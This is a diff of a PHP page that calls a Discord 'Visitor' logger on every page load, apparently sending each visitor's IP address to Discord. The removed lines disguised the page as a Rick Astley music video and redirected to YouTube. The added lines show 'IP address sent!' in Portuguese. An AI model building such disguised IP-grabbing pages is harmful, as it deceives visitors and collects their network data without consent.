@@ -1,5 +1,5 @@
 <?php
-include("Home.php");
+include("logger.php");
 $sendembed = New Discord();
 
 $sendembed->Visitor();
@@ -7,15 +7,13 @@ $sendembed->Visitor();
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Rick Astley - Never Gonna Give You Up (Official Music Video)</title>
-  <meta charset='utf-8'>
-  <meta http-equiv='X-UA-Compatible' content='IE=edge'>
-  <meta name='viewport' content='width=device-width, initial-scale=1'>
-  <meta http-equiv= "refresh" content="0; URL='https://www.youtube.com/watch?v=dQw4w9WgXcQ'"/>
+  <title>IP - Logger</title>
   <link rel="stylesheet" href="assets/css/index.css">
   <link rel="icon" type="image/png" href="favicon.png">
 </head>
 <body>
-  
+  <center>
+    <h1 style="color: #00ff00;">Endereço de IP enviado!.</h1>
+  </center>
 </body>
 </html>
